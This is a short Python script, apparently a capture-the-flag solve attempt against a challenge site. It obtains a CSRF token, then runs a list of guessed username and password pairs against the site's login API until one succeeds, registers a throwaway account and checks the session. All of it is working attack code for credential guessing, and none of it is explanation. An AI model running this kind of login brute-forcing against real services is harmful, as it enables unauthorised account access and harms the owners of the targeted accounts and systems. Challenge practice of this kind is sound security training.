import urllib.request, ssl, json, http.cookiejar

base = "https://lantern.hackthe.website"
ctx = ssl.create_default_context()
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))

def get(path):
    r = opener.open(urllib.request.Request(base+path, headers={"User-Agent":"Mozilla/5.0"}), timeout=15)
    return r.status, r.read(8000).decode("utf-8","replace")

def post(path, body, csrf):
    data = json.dumps(body).encode()
    req = urllib.request.Request(base+path, data=data, method="POST",
        headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/json","X-CSRF-Token":csrf})
    try:
        r = opener.open(req, timeout=15)
        return r.status, r.read(4000).decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(2000).decode("utf-8","replace")

# 1) CSRF
s, o = get("/api/auth/csrf-token")
csrf = json.loads(o).get("token","")
print("CSRF:", csrf)
print("Cookies:", [(c.name, c.value[:30]) for c in cj])

# 2) Login attempts
creds = [
    ("vyrqelith","blackvault"), ("vyrqelith","Max42"), ("vyrqelith","nightlens_42"),
    ("nightlens_42","blackvault"), ("arcadeghost","arcadeghost"), ("admin","admin"),
    ("vyrqelith","CorrectHorseBatteryStaple"), ("vyrqelith","Welcome2026!"),
]
for user, pwd in creds:
    s, o = post("/api/auth/login", {"username":user,"password":pwd}, csrf)
    print(f"login {user}/{pwd}: {s} {o[:200]}")
    if s == 200:
        print("  >>> LOGGED IN!")
        break

# 3) Register
s, o = post("/api/auth/register", {"username":"hunter_solve","email":"solve@test.com","password":"Solve2026!"}, csrf)
print(f"register: {s} {o[:200]}")

# 4) Check session
try:
    s, o = get("/api/auth/session")
    print(f"session: {s} {o[:200]}")
except Exception as e:
    print(f"session: ERR {e}")
